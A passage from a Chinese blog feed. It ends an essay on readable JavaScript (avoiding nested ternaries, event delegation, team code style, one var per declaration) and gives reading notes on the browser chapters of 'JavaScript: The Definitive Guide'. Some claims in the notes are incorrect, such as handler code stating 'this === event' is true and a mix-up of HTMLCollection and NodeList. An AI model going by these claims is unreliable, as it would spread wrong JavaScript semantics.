<p>我很少看各种类库的源码，因为我觉得太晦涩了，虽然有时也觉得写得真是精妙，但这是建立在花费几倍的时间去理解和钻研的前提下，有时还得借助搜索引擎的帮助（其实还是因为太菜了么？读不懂啊）。因此我是强烈反对把各种奇淫技巧带到实际的工作项目中的，除非你能确定这个项目从出生到死亡都只有你一个人在干。</p>
<p>这里举个简单的例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 儿童和妇女半价！</span></div><div class="line"><span class="keyword">var</span> price = <span class="function"><span class="keyword">function</span> (<span class="params">age, sex</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> age &lt; <span class="number">18</span> ? <span class="number">50</span> : sex === <span class="string">'female'</span> ? <span class="number">50</span> : <span class="number">100</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其实是很简单的逻辑，就是未成年和女性可以享受半价，但由于使用了两个三元运算符，简单的逻辑反而要认真地思考以下才知道（还有运算符的优先级问题呢）</p>
<p>实际工作中，我也遇到了同事非常喜欢用三元运算符的，他说三元运算符看起来更简洁一些，相比 <code>if...else</code> 能节省很多代码</p>
<p>我刚开始的时候也是觉得这样真是太赞了，看起来很牛逼的写法呢。但是现在，我在思考三元运算符到底是把事情搞复杂了还是变优雅了，对比一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 儿童和妇女半价！</span></div><div class="line"><span class="keyword">var</span> price = <span class="function"><span class="keyword">function</span> (<span class="params">age, sex</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> result = <span class="number">100</span></div><div class="line">  <span class="keyword">if</span> (age &lt; <span class="number">18</span> || sex === <span class="string">'female'</span>) &#123;</div><div class="line">    result = <span class="number">50</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>嗯，确实，代码从一行变成了5行，足足翻了5倍！但我敢说，这次一下子就知道函数的逻辑。</p>
<p>实际上我还发现一个地方，那就是现在基本都会使用 <code>UglifyJS</code> 对代码进行压缩<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 压缩混淆前</span></div><div class="line"><span class="keyword">if</span> (condition) &#123;</div><div class="line">  doSome(<span class="literal">true</span>)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  doSome(<span class="literal">false</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">// UglifyJS 压缩混淆后</span></div><div class="line">condition?doSome(!<span class="number">0</span>):doSome(!<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p><code>UglifyJS</code> 对 <code>if...else</code> 语句常用对压缩算法就是使用三元运算符！也就是说你辛苦为性能也好，为节省字节也好，只不过是消费读者的脑力。</p>
<p>当然，我这里并不是说性能不重要，但过早但优化是万恶之源，牺牲可读性来做到所谓的简洁和高性能，是不是有点本末倒置呢？毕竟，随着硬件网络的发展，我们通过这种方式节约的带宽和性能可以说是微乎其微。在敏捷开发的时代，效率和维护迭代才是最重要的。</p>
<h2 id="经典一般都经历了时间的检验"><a href="#经典一般都经历了时间的检验" class="headerlink" title="经典一般都经历了时间的检验"></a>经典一般都经历了时间的检验</h2><p>这里说的经典，其实也算是简单易懂的延续，有些技术在刚出现时可能相当复杂，但随着时代但发展，成为每个人都知道但东西但时候，这就不能算是奇淫技巧了，而是应该叫做最佳实践</p>
<p>我记得我第一次写切换列表时的时候，头都大了，因为有接近二十个项目，那时候因为什么也不懂，所以写出来的是这样子的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkName</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> _name = $(<span class="string">'#form-name'</span>)</div><div class="line">  _name.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// ...继续逻辑</span></div><div class="line">  &#125;)</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAddress</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> _address = $(<span class="string">'#form-address'</span>)</div><div class="line">  _address.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// ...继续逻辑</span></div><div class="line">  &#125;)</div><div class="line">&#125;</div><div class="line"><span class="comment">// ... 一直这样验证下去</span></div></pre></td></tr></table></figure></p>
<p>你能想象每一个按钮都绑定了一个事件处理程序，只是为了切换不同的 Ajax 请求么？当然，现在我会用事件委托上去：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checker</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  $(<span class="string">'form'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> type = $(<span class="keyword">this</span>).attr(<span class="string">'data-type'</span>)</div><div class="line">    <span class="keyword">if</span> (type === <span class="string">'name'</span>) &#123;</div><div class="line">      <span class="comment">// 一直这样验证下去</span></div><div class="line">    &#125;</div><div class="line">  &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>正如这里使用事件委托抽象 Ajax 请求才是最合适的做法一样，很多最佳实践是需要经验的。一个设计模式即使再好，但读者不懂得这样做但深层次原理，也就无法理解这样写的原因，于是在该读者眼里，这反而成了一种 “奇淫技巧”。因此写出好代码的一个条件，那就是自身要有足够的积累，不至于连业内通用的一些技巧或者说是最佳实践都难以理解。</p>
<h2 id="统一就好办"><a href="#统一就好办" class="headerlink" title="统一就好办"></a>统一就好办</h2><p>想必都知道 JS 社区最热门的两个问题是，到底要不要加分号，缩进到底是两个空格还是四个空格好</p>
<p>很多这些争吵不会有一个统一的结果，因为很多时候是一个人的喜好问题而已。但当把个人但喜好带到团队中的时候，问题就开始麻烦起来了</p>
<p>在早先的日子里，让我去维护前人写的那些项目的时候，我很痛苦的一件事情就是，到底要不要手动帮它们的格式改成我喜欢的格式啊？最可恶的时候可能是明明是同一个文件，居然有三四种杂交的代码风格！</p>
<p>其实这里问题很好解决，那就是使用统一的团队代码风格，创业公司刚开始可能没有注意到这一点，但要知道，人员是会流动的，如果没有统一的团队风格指导，往往接手的人写出来的代码风格是完全不同的。这里建议的一点是，最好是使用社区的已经整理好的代码风格（实际上就是参照大公司），配合 Linter 工具有神奇的效果喔</p>
<h2 id="最好一开始考虑成长的代价"><a href="#最好一开始考虑成长的代价" class="headerlink" title="最好一开始考虑成长的代价"></a>最好一开始考虑成长的代价</h2><p>这里真的是血的教训了，当你的代码长度有上万行的时候，你就会发现，很多时候时间都浪费在寻找特定的代码行。</p>
<p>在工作中有一个项目是实现一个店铺系统，JavaScript 代码两万行，CSS 代码近一万行的规模。可怜的我们为了能够让客户们方便地自定义代码（这根本就是一个伪需求嘛！），直接使用的全局单例模式，然后把所有模块的逻辑和样式分别塞到一个 JS 文件和 CSS 文件中……这意味着单个 JS 文件就约一万行了（桌面浏览器和手机浏览器分开实现）</p>
<p>写的时候当然是没什么太大问题，但是项目上线了，总会有新的需求和新的优化，这时就成为了我们的噩梦了……</p>
<p>首先当然是因为模块们全都塞在一起了，公有的方法控件什么的也共处一室，修改的时候我就得打开编辑器不断地跳来跳去，只因为逻辑太多<br>其次是对于 CSS 而言，没有用预处理的情况下，公有私有的方法混在一起非常难办，有时微调一个模块的功能，为了不影响其他模块的样式，难免引入脏代码覆盖，久而久之，我就不知道这几千条样式中是有多少条是重复的了。</p>
<p>因此，我在这里吸取到的教训是，如果你的 JS 代码或 CSS 有可能超过三千行，那么请严肃考虑到底要不要使用预处理器和模块化开发。如果答案是否，请再考虑该项目后续迭代的速度和功能变更可能性。</p>
<h2 id="也要考虑复制粘贴"><a href="#也要考虑复制粘贴" class="headerlink" title="也要考虑复制粘贴"></a>也要考虑复制粘贴</h2><p>这里说一个有趣的例子，我们在写店铺系统的时候，因为是要把 DOM 结构全部写到 JS 中方便统一热更新，这里我们发现，拼接字符串真是一个好痛苦的事情，看下面几种写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 写法一：好直白的一行，可是维护起来好痛苦，一行代码中貌似有一整个宇宙</span></div><div class="line"><span class="keyword">var</span> string1 = <span class="string">'&lt;div class="wrapper"&gt;&lt;div class="inner"&gt;里面还有好多嵌套的说&lt;/div&gt;&lt;/div&gt;'</span></div><div class="line"></div><div class="line"><span class="comment">// 写法二：逼格满满的提示这里只是换行，但 IE8 不支持啊</span></div><div class="line"><span class="keyword">var</span> string2 = <span class="string">'&lt;div class="wrapper"&gt;\</span></div><div class="line">  &lt;div class="inner"&gt;里面还有好多嵌套的说&lt;/div&gt;\</div><div class="line">&lt;/div&gt;'</div><div class="line"></div><div class="line"><span class="comment">// 写法三：古老的数组写法，看着确实还勉强，老大说 IE6 以前都是这么写的，性能好</span></div><div class="line"><span class="keyword">var</span> string3 = [<span class="string">'&lt;div class="wrapper"&gt;'</span>,</div><div class="line">  <span class="string">'  &lt;div class="inner"&gt;里面还有好多嵌套的说&lt;/div&gt;'</span>,</div><div class="line">  <span class="string">'&lt;/div&gt;'</span>].join(<span class="string">''</span>)</div><div class="line"></div><div class="line"><span class="comment">// 写法四：加号拼接，还不错的样子</span></div><div class="line"><span class="keyword">var</span> string4 = <span class="string">''</span>+</div><div class="line">  <span class="string">'&lt;div class="wrapper"&gt;'</span>+</div><div class="line">  <span class="string">'  &lt;div class="inner"&gt;里面还有好多嵌套的说&lt;/div&gt;'</span>+</div><div class="line">  <span class="string">'&lt;/div&gt;'</span></div><div class="line"></div><div class="line"><span class="comment">// 这里本来留给 ES6 的字符串模版，然而都用上 ES6 还讨论这些做啥</span></div></pre></td></tr></table></figure></p>
<p>我们最后选择了第四种写法，其实只考虑了两点：既有HTML风格的缩进，又不至于每一行风格差异太大导致经常复制粘贴错误。</p>
<p>是的，复制粘贴也是一个需要考虑的地方，很多人兴许没有注意到</p>
<p>我们来看一段代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a, b = <span class="number">1</span>, c = <span class="literal">null</span>, d;</div></pre></td></tr></table></figure></p>
<p>没错，就是很多有经验的人喜欢使用的一种模式，社区中又叫做单 <code>var</code> 模式，出现这种模式的原因么，就是因为 JavaScript 中的变量会提升，那么有人就建议在函数的开头定义好全部的变量，由于只使用来一个 <code>var</code> 可以很突出地告诉读者这里声明了所有的变量</p>
<p>乍一看好像没什么问题，不过我要指出其严重的两点不足之处，首先是对于 Git 等版本管理工具而言，如果修改了其中一个变量的初始值，那么 Git 中记录的是这一整行有变动，却又无法一眼看到到底是哪个变动了（需要整行进行对比），不过这个问题可以通过一种改进的写法来优化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a,</div><div class="line">  b = <span class="number">1</span>,</div><div class="line">  c = <span class="literal">null</span>,</div><div class="line">  d;</div></pre></td></tr></table></figure></p>
<p>这样以来就解决了 Git 中变更的问题，但其实不管是优化前还是优化后，我们都要注意到一个点，就是复制粘贴代码的时候极其容易忘记把 <code>var</code> 声明写完整。变量全部提升到头部一起声明的一个缺点就是，后续复制用到的代码块到其他地方的时候，需要重新考虑是否把声明落下</p>
<p>其实我是推荐一声明一变量，用到时再定义的做法的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 这样既方便复制易懂，又能在 Git 中良好处理，同时也是同步的逻辑</span></div><div class="line"><span class="keyword">var</span> arr = []</div><div class="line"><span class="keyword">var</span> arr2 = [<span class="number">1</span>, <span class="number">2</span>]</div><div class="line">arr.push(<span class="number">1</span>)</div><div class="line"><span class="keyword">var</span> len = arr.length</div><div class="line">arr[len + <span class="number">1</span>] = <span class="number">2</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>有趣的是，<code>UglifyJS</code> 同样会帮您优化这里，多个 var 声明的方式最后也被改成了单 var 的形式以节省字符。鉴于此，我建议是还是以可读性可维护性优先</p>
</blockquote>
<p>支撑我这种思路的还有一个点是，在 ES6 中，<code>let</code> 和 <code>const</code> 是不存在变量提升的，同时也推荐使用时再声明。我这种做法只是学习了未来的一个最佳实践罢了</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>每个人眼中的优雅的代码的模样可能都不同，也许有很多标准，我所能做的就是多踩些坑，能给后面会接手自己代码的人少些麻烦，也是程序员的一种美德</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近对于代码的组织和优化思考了很多，也看完了知名的“蝴蝶书”，本着思考了还是总结一下的原则，还是记录一下自己的认识方便后面嘲讽自己有多么菜&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《JavaScript权威指南》阅读笔记（下）</title>
    <link href="https://github.com/Hyifu/2016/04/03/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2016/04/03/《JavaScript权威指南》阅读笔记（下）/</id>
    <published>2016-04-02T16:00:00.000Z</published>
    <updated>2017-04-17T02:51:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续阅读，这里是客户端JavaScript实现的部分</p>
<p><img src="/images/JavaScript权威指南.jpg" alt="JavaScript权威指南"></p>
<a id="more"></a>
<h3 id="Web浏览器中的JavaScript"><a href="#Web浏览器中的JavaScript" class="headerlink" title="Web浏览器中的JavaScript"></a>Web浏览器中的JavaScript</h3><ul>
<li><p>Location对象的新发现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location == location.href <span class="comment">// true，location 对象调用了 toString() 方法</span></div><div class="line">location = <span class="string">'www.example.com'</span> <span class="comment">// 相当于给 location.href 赋值</span></div><div class="line"><span class="built_in">window</span>.location === <span class="built_in">document</span>.location <span class="comment">// true</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;script&gt;</code> 标签如果有 <code>src</code> 属性，则 <code>&lt;script&gt;</code> 标签中的任何内容均会被忽略</p>
</li>
<li><code>&lt;script&gt;</code> 标签中如果包含不被浏览器识别的 <code>type</code> 属性，浏览器会尝试解析但不执行/显示，利用这个可以做成 <code>HTML模板</code> (只限内联)，如 <code>&lt;script type=&quot;yhsd-template&quot;&gt;...模板内容...&lt;/script&gt;</code>；但如果同时又指定了 <code>src</code> 属性，该标签会被忽略</li>
</ul>
<h3 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h3><ul>
<li><code>setTimeout(func, 0)</code> 中，函数 <code>func</code> 不会立刻执行，而是等待前面事件处理程序都运行完再“立即”执行</li>
<li>一个有趣的历史遗留问题是，当元素的 <code>id</code> （或特殊元素的 <code>name</code>）不是 <code>window</code> 对象的一个属性时，该元素会被隐式的成为全局的一个属性。实践中尽量避免使用这种方式，HTML5 标准中已废弃<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>我会被隐式成为全局属性<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"alert"</span>&gt;</span>我被alert方法覆盖了！！！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"user"</span>&gt;</span>我被自定义全局变量方法覆盖了！！！<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"foo"</span> <span class="attr">name</span>=<span class="string">"foo"</span> <span class="attr">src</span>=<span class="string">"example2.png"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"foo"</span> <span class="attr">name</span>=<span class="string">"foo"</span> <span class="attr">src</span>=<span class="string">"example3.png"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="built_in">window</span>.btn === <span class="built_in">document</span>.getElementById(<span class="string">'btn'</span>) <span class="comment">// true</span></div><div class="line">  <span class="built_in">window</span>.alert === <span class="built_in">document</span>.getElementById(<span class="string">'alert'</span>) <span class="comment">// false，被 window.alert 方法覆盖</span></div><div class="line">  <span class="comment">//</span></div><div class="line">  <span class="keyword">var</span> user = <span class="string">'user defined'</span></div><div class="line">  <span class="built_in">window</span>.user === <span class="built_in">document</span>.getElementById(<span class="string">'user'</span>) <span class="comment">// false，被自定义全局变量覆盖了</span></div><div class="line">  <span class="comment">//</span></div><div class="line">  <span class="built_in">window</span>.foo === <span class="built_in">document</span>.getElementsByClassName(<span class="string">'foo'</span>) <span class="comment">// false 前者为 HTMLCollection 对象，后者为NodeList对象</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="脚本化文档"><a href="#脚本化文档" class="headerlink" title="脚本化文档"></a>脚本化文档</h3><ul>
<li>HTMLCollection 和 NodeList 对象是动态的，实时反应 DOM 中的变化，因此在实际应用中可能需要保存获取时的静态副本以避免后续变动造成影响</li>
<li>HTMLCollection 和 NodeList 对象具有细微的区别，前者是标准DOM的 Core 接口，后者为 HTML 独有并多了一个 <code>namedItem</code> 方法；HTMLCollection 是元素集合而 NodeList 是节点集合（即可以包含元素，也可以包含文本节点）</li>
<li>标准显示的文档中，<code>getElementsByClassName()</code> 方法区分大小写（怪异模式则不区分大小写）</li>
<li>IE8不支持 <code>getElementsByClassName()</code> 方法，但却支持 <code>querySelectorAll()</code> 方法</li>
<li><p>通过 <code>querySelectorAll()</code> 获取的 NodeList 对象不是实时动态的，而是获取时的静止快照。<code>querySelector()</code> 只选中第一个匹配的元素。</p>
<blockquote>
<p>在Element调用 querySelector 方法，选择器仍然搜索整个文档，但会过滤出基于该 Element 的后代元素返回，这意味着在这种情况下相对于 <code>getElementBy*方法</code> 会消耗更多的性能</p>
</blockquote>
</li>
<li><p>对于 <code>&lt;p&gt;This is a &lt;i&gt;simple&lt;/i&gt;document&lt;/p&gt;</code> 而言，<code>&lt;p&gt;</code> 标签中的内容是什么？</p>
<ul>
<li><code>innerHTML</code> —— <code>This is a &lt;i&gt;simple&lt;/i&gt;document</code></li>
<li><code>outerHTML</code> —— <code>&lt;p&gt;This is a &lt;i&gt;simple&lt;/i&gt;document&lt;/p&gt;</code></li>
<li><code>innerText</code> —— <code>This is a simple document</code></li>
</ul>
</li>
<li>元素、滚动条、窗口的大小位置获取及设置的理解（结合图示）</li>
<li><code>onsubmit</code> 事件处理程序中返回 <code>false</code> 可取消提交，该事件只能通过“提交”按钮触发，直接用JS调用 <code>submit()</code> 方法无效（<code>onreset</code> 同理）</li>
<li>建议不用 <code>&lt;a&gt;</code> 标签模拟非链接的按钮，以更加语义化（当脚本失效时用链接代替按钮的功能是一种优雅降级，脚本失效仍可点开新页面进入下一步）</li>
<li>单选/复选按钮中使用 <code>change</code> 事件代替 <code>click</code></li>
<li><code>&lt;input type=&quot;file&quot;&gt;</code> 的 <code>value</code> 是只读的，防止恶意JS上传</li>
<li>通过设置标签的 <code>contenteditable</code> 属性创建可编辑区域是富文本编辑器的常用手段，其中浏览器支持多种 API，但这些 API 的兼容可能需要考虑，建议使用富文本编辑器插件。</li>
</ul>
<h3 id="脚本化CSS"><a href="#脚本化CSS" class="headerlink" title="脚本化CSS"></a>脚本化CSS</h3><ul>
<li>元素的style属性的值是一个 <code>CSSStyleDeclaration</code> 对象，而非字符串，而其所有属性的值都是字符串(必须带单位，如’20px’)；该对象读取和改变的均是 HTML/JS 显示声明的内联样式，因此外联样式表的样式无法被读取。</li>
<li>计算样式也是得到一个 <code>CSSStyleDeclaration</code> 对象，使用 <code>window.getComputedStyle(element, null)</code><ul>
<li>计算样式是只读的</li>
<li>其属性的值是绝对值，相对值会转化成绝对值</li>
<li>不计算 margin 这种复合属性，而是 marginLeft 这种基础属性</li>
<li>未定义 cssText 属性</li>
<li>不支持 IE8 及以下版本(IE 中类似的方法为 currentStyle)</li>
</ul>
</li>
<li>通过 <code>document.styleSheets</code> 可获得只读的样式列表，包括内联和外联样式</li>
</ul>
<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><ul>
<li><code>focus</code> 和 <code>blur</code> 事件不会冒泡</li>
<li>如使用 <code>beforeunload</code> 事件可以询问用户是否离开当前页面</li>
<li><code>addEventListener()</code> 方法的第三个参数通常省略（省略false即为冒泡模式），相同参数只能注册一次</li>
<li>IE8使用<code>attachEvent()</code>，只支持事件冒泡（因此没有第三个参数），带 <code>on</code> 前缀，可多次注册多次调用</li>
<li><p>通过设置属性注册 <code>IE8</code> 的事件对象时通过 <code>window.event</code> 传递而非标准的参数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">e.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  event = event || <span class="built_in">window</span>.event; <span class="comment">// IE8中通过window.event传递event</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 而在attachEvent则两种方式均可</span></div></pre></td></tr></table></figure>
</li>
<li><p>事件处理程序的运行环境如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 通过设置属性注册，会被转换为能存取全局变量的顶级函数，但由于历史原因，也能使用局部变量</span></div><div class="line">e.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span> === event <span class="comment">// true, this 指向事件目标</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 通过事件添加器注册</span></div><div class="line">e.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span> === event <span class="comment">// true, this 指向事件目标</span></div><div class="line">&#125;, <span class="literal">false</span>)</div><div class="line"><span class="comment">//</span></div><div class="line">e.attachEvent(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span> === event <span class="comment">// false, this 指向全局对象 window</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p>尽量避免使用 HTML 属性来绑定事件处理程序，因为其隐式改过的作用域会导致许多问题</p>
</li>
<li>通过 HTML 属性绑定的事件处理程序返回 <code>false</code> 可阻止其默认行为，而通过 <code>addEventListener()</code> 或 <code>attachEvent()</code> 方式则可通过调用 <code>preventDefault()</code> 或者设置其 <code>returnValue</code> 属性实现</li>
<li>多个事件处理程序作用于同一个事件时，通过 HTML 属性绑定的事件处理程会优先调用（类似内联样式），<code>addEventListener()</code> 则按注册顺序调用</li>
<li>文档元素的 <code>load</code> 事件会冒泡到 <code>document</code> 对象并停止（不会冒泡到 <code>window</code> 对象），只有整个文档都加载完毕才会出发 <code>window</code> 的 <code>load</code> 事件</li>
<li>事件传播的三个阶段：事件捕获，目标事件处理程序，事件冒泡（DOM Lv3中标准化）</li>
<li><code>addEventListener()</code> 调用 <code>stopPropagation()</code>，或 <code>attachEvent()</code> 设置 <code>cancelBubble</code> 属性为  <code>true</code>，均可阻止事件的传播（阻止冒泡）</li>
<li><strong>window</strong> 对象的 <code>load</code> 事件触发需要文档和全部图片等资源加载完毕后才触发，而 <code>DOMContentLoaded</code> 事件则在 DOM 结构解析完毕且延迟脚本执行完毕即触发（在具备很多图片和异步脚本时比 <code>load</code> 事件更快完成，类似 jQuery 的 <code>$(document).ready()</code> 方法）</li>
<li>除了<code>mouseenter</code> 和 <code>mouseleave</code> 外的鼠标事件均会冒泡</li>
</ul>
<h3 id="脚本化HTTP"><a href="#脚本化HTTP" class="headerlink" title="脚本化HTTP"></a>脚本化HTTP</h3><ul>
<li>常见的实现（均基于GET）：<ul>
<li>方法1：设置一个 <code>&lt;img&gt;</code> 元素的src属性，把信息（如当前地址）作为图片 URL 的查询字符串部分，服务器会返回一个信标图片作为请求结果（通常是1×1像素的透明图片），该方法是单向的，但不受同源限制，一般用来跟踪流量</li>
<li>方法2：使用 <code>&lt;iframe&gt;</code> （通常对用户也不可见）代替 <code>&lt;img&gt;</code>，服务器返回是包含响应内容的 HTML 在 <code>iframe</code> 中显示，脚本再遍历得到目的信息，该方法受限于同源策略</li>
<li>方法2：设置 <code>&lt;script&gt;</code> 作为容器，该方法兼具方法1和方法2的优点（双向交互，不受同源限制），常见主流实现如<strong>JSONP</strong></li>
</ul>
</li>
<li><strong>GET</strong> 请求适用于 <code>URL</code> 完全制定请求资源，对服务器无任何副作用，且其响应可缓存的情况</li>
<li><code>xhr.open(&#39;GET&#39;, url, false)</code>，第三个参数显示传入 <code>false</code>，则该请求为同步阻塞的，一般避免使用</li>
</ul>
<h3 id="客户端存储"><a href="#客户端存储" class="headerlink" title="客户端存储"></a>客户端存储</h3><ul>
<li><code>localStorage</code> 和 <code>sessionStorage</code> 均代表同一个 <strong>Storage</strong> 对象（一个持久化关联数组），数组的使用字符串索引和字符串形式的值；两者的区别在于存储时间及访问权限<ul>
<li><code>localStorage</code> 的存储期限是永久的（除非刻意删除），而 <code>sessionStorage</code> 则在标签（会话级别）关闭后即失效</li>
<li><code>localStorage</code> 可被同源文档读写（不同标签页间共享），而 <code>sessionStorage</code> 不禁限制同源还限制不同标签页不能共享</li>
</ul>
</li>
<li>当 <code>Storage</code> 数据发生改变时会触发存储事件（onstorage）</li>
<li>IE8 以上版本支持 Storage，而 IE6/IE7 可用类似的 <code>userData</code> 实现</li>
<li>同源一般说明：协议、主机名、端口均相同</li>
<li>要判断浏览器的 <code>cookie</code> 是否启用的兼容方法是快速写入 / 读取测试数据</li>
<li><code>cookie</code> 的可读性与创建它的页面有关，当前页面同目录及其子目录可见，而对其他页面不可见（可通过设置参数设置其目录路径）</li>
<li><code>cookie</code> 在大部分浏览器中有大小限制，单个<code>cookie</code> 限制为 4kb</li>
<li><p>离线存储前需要设置 <code>manifest</code> （MIME类型：<code>text/cache-manifest</code>）清单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">"myapp.appcache"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 以下是上述清单文档的内容，更新版本号可让浏览器重新获取新资源以替换过时缓存 --&gt;</span></div><div class="line"># Myapp version 1</div><div class="line">myapp.html</div><div class="line">myapp.css</div><div class="line">myapp.png</div></pre></td></tr></table></figure>
</li>
<li><p><code>navigator.onLine</code> 属性可以判断当前应用是否在线</p>
</li>
</ul>
<h3 id="多媒体和图形编程"><a href="#多媒体和图形编程" class="headerlink" title="多媒体和图形编程"></a>多媒体和图形编程</h3><ul>
<li><code>SVG</code> 是一种描述图形的 XML 语法，IE9 及以上浏览器支持；</li>
